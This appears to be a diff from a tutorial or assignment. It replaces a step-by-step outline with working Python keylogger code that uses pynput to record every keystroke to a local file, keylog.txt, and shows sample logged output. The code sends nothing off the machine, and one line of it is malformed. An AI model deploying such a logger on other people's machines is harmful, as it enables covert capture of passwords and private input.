@@ -1,18 +1,22 @@
-Step 1:      Initialize Libraries and Modules 
-              •	Import the pynput library to capture keyboard events. 
-Step 2:       Define Event Handlers 
-              •	Define on_press function to handle and log key press events. 
-              •	Define on_release function to handle key release events and stop the listener 
-                if the Esc key is pressed. 
-Step 3:       Setup and Start Listener 
-              •	Create an instance of keyboard.Listener. 
-              •	Set the on_press and on_release functions as callbacks for the listener. 
-              •	Start the listener to begin capturing keystrokes. 
-Step 4:         Log Keystrokes 
-              •	In the on_press function, write the captured keystrokes to a log file 
-              (keylog.txt). 
-              •	Ensure both printable characters and special keys are logged appropriately. 
-Step 5:       Stop Listener 
-                •	In the on_release function, return False if the Esc key is pressed to stop the 
-                  listener
+Python code: 
+   
+ from pynput import keyboard 
  
+# Function to handle key press events 
+def on_press(key): 
+    with open("keylog.txt", "a") as log_file: 
+        try: 
+            log_file.write(key.char) 
+        except AttributeError: 
+            log_file.write(f' {key} ') 
+ 
+# Function to handle key release events 
+def on_release(key): 
+    if key == keyboard.Key.esc: 
+        return False 
+# Start the keyboard listener
+listener = keyboard.Listener(on_press=on_press, on_release=on_release) listener.start()
+listener.join()
+Output:
+H e l l o W o r l d Key.space Key.esc
+
